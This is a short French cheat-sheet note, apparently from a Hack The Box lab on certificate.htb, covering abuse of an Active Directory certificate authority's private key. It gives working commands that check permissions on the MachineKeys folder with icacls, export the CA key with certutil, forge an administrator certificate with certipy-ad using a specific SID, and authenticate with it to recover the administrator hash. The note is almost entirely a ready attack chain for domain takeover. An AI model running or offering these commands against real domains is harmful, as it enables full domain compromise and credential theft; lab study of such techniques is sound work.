
> [!TIP]
> Si accès FullControl sur la clé privé du CA, alors possible d'exporter la clé et de forger des certificats pour n'importe quel user
> 

Private Key dans "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\"


Checker les droits sur les clés privés

```
icacls "C:\ProgramData\Microsoft\Crypto\RSA\MachineKeys\"
```

Si (F) , alors exporter la clé avec certutil au format PFX.

```
certutil -exportPFX -p "password" -privatekey "nom_du_CA" ca_key.pfx
```

Forger un certificat pour administrator

```
certipy-ad forge -ca-pfx ca_key.pfx -ca-password "password" -upn administrator@certificate.htb -sid "S-1-5-21-515537669-4223687196-3249690583-500" -subject "CN=ADMINISTRATOR,CN=USERS,DC=CERTIFICATE,DC=HTB" -out administrator.pfx
```

PassTheCert & UnPAC the hash

```
certipy-ad auth -pfx "administrator.pfx" -dc-ip '10.10.11.71' -username 'administrator' -domain 'certificate.htb'
```